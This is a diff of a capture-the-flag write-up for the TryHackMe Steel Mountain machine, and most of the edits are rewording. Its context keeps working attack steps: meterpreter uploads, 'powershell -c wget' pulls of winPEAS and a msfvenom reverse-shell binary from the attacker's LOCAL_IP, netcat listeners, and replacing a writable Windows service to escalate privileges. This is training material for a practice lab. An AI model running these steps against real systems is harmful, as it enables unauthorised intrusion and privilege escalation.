@@ -167,7 +167,7 @@ meterpreter > cat user.txt
 
 <br />
 
-Following along with the instructions and download the [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) script that we can upload via our `meterpreter` shell.
+Follow along with the instructions and download the [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) script that we can place on the target via our `meterpreter` shell.
 
 ```
 meterpreter > upload /root/TryHackMe/Machines/Steel\ Mountain/PowerUp.ps1
@@ -178,7 +178,7 @@ meterpreter > upload /root/TryHackMe/Machines/Steel\ Mountain/PowerUp.ps1
 
 <br />
 
-Before running the script make sure to load the `powershell` extension in `meterpreter` and enter it to successfully enumerate the box.
+Before running the script make sure to load the `powershell` extension in `meterpreter` and initialize it to successfully enumerate the box.
 
 ```
 meterpreter > load powershell 
@@ -214,8 +214,10 @@ Saved as: ASCService.exe
 Set up an active listener locally using the same local port value we assigned to the `msfvenom` payload.
 
 ```
-nc LOCAL_IP LOCAL_PORT
+nc -lvnp LOCAL_PORT
 ```
+
+<br />
 
 Now stop the running service on the target and replace it with the payload we created. 
 
@@ -315,7 +317,7 @@ Start a `netcat` listener on the port number specified on the exploit. Then, pro
 
 <br />
 
-Get a copy of [WinPEAS.exe](https://github.com/carlospolop/PEASS-ng/releases) that we can use to upload to the target machine, then proceed to place it on the desktop folder of the current user.
+Grab a copy of [WinPEAS.exe](https://github.com/carlospolop/PEASS-ng/releases) that we can use to upload to the target machine, then proceed to place it on the desktop folder of the current user.
 
 ```
 C:\Users\bill\Desktop>powershell -c wget "http://LOCAL_IP:80/winPEAS.exe" -outfile "winpeas.exe"
@@ -344,7 +346,7 @@ The results from `WinPEAS` return a list of vulnerable services that we could po
 
 <br />
 
-We can further investigate this service from its parent directory to see if we can manually start/stop it, as well as write over it - Should that be the case, we can use a reverse shell payload to replace this service and escalate our privileges.
+We can further investigate this service from its parent directory to see if we can manually start/stop it, as well as write over it - Should that be the case, we can replace it to escalate our privileges.
 
 ```
 C:\Program Files (x86)\IObit>sc qc AdvancedSystemCareService9
@@ -382,7 +384,7 @@ Successfully processed 1 files; Failed processing 0 files
 
 <br />
 
-Looks like this is indeed an interactive service which our user has read, write and execute permissions on, we can therefore proceed to replace it with a reverse shell as mentioned above and restart it.
+Looks like this is indeed an interactive service and our user has read, write and execute permissions on the folder, we can therefore proceed to replace it with a reverse shell and restart it.
 
 <br />
 <br />
@@ -417,7 +419,7 @@ SERVICE_NAME: AdvancedSystemCareService9
 
 <br />
 
-Upload the reverse shell via the `python` server we used to connect to this machine earlier if it is still running in the background, otherwise set up a temporary one from scratch.
+Transfer the reverse shell to the target via the `python` server we used to connect to this machine earlier if it is still running in the background, otherwise set up a temporary one from scratch.
 
 ```
 C:\Program Files (x86)\IObit\Advanced SystemCare>powershell -c wget "http://LOCAL_IP:80/ASCService.exe" -outfile "ASCService.exe"
@@ -448,7 +450,7 @@ nc -lvnp LOCAL_PORT
 
 <br />
 
-Now start the service to establish a connection with our target machine with `netcat`.
+Now start the service to establish a connection with our target machine.
 
 ```
 C:\Program Files (x86)\IObit\Advanced SystemCare>sc start AdvancedSystemCareService9
